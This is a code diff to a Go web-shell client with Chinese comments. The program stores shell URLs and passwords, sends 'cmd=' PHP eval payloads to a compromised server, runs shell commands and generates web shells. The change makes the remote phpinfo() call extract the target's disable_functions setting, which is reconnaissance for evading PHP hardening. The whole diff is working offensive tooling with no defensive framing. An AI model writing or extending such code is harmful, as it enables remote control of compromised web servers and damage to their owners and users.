@@ -9,6 +9,7 @@ import (
 	"log"
 	"net/http"
 	"os"
+	"regexp"
 	"strings"
 )
 
@@ -31,7 +32,9 @@ func addURL() {
 	fmt.Scanln(&other)
 	db, err := connectDb()
 	handleError(err, "连接数据库出错!")
-	defer db.Close()
+	defer func(db *sql.DB) {
+		_ = db.Close()
+	}(db)
 	insertDataSQL := `
     INSERT INTO info (url, passwd, ua, other) VALUES (?, ?, ?, ?);`
 	_, err = db.Exec(insertDataSQL, url, passwd, ua, other)
@@ -147,33 +150,38 @@ func shellExec(payload string) {
 }
 
 func phpinfo() {
-	info := executeCode("phpinfo()")
-	fmt.Println(info)
+	text := executeCode("phpinfo()")
+	re, err := regexp.Compile(`disable_functions</td><td class="v"> .* </td>`)
 
+	handleError(err, "正则表达式编译错误!")
+	result := re.FindAllString(text, -1)
+	fmt.Println("匹配的结果:")
+	for _, match := range result {
+		fmt.Println(match)
+	}
 }
 
-func executeCode(payload string) *http.Response {
+func executeCode(payload string) string {
 	evalPayload := "cmd=" + payload + ";"
 	// 使用 makeRequest 发送 PHP 代码执行请求
 	respEval, err := makeRequest(evalPayload)
-	handleError(err, "请求执行代码失败")
 
+	handleError(err, "发送payload失败!")
 	// 延迟关闭响应体
 	defer func(body io.ReadCloser) {
 		err := body.Close()
-		handleError(err, "关闭响应失败")
+		handleError(err, "关闭响应失败!")
 	}(respEval.Body)
 
 	// 读取和打印 PHP 代码执行响应
 	bodyEval, err := io.ReadAll(respEval.Body)
-	handleError(err, "读取响应体失败")
+	handleError(err, "打印php响应失败! ")
 
 	if string(bodyEval) != "" {
 		fmt.Println("执行代码响应:")
 		fmt.Println(string(bodyEval))
 	}
-	return respEval
-
+	return string(bodyEval)
 }
 
 func generateWebShell() {
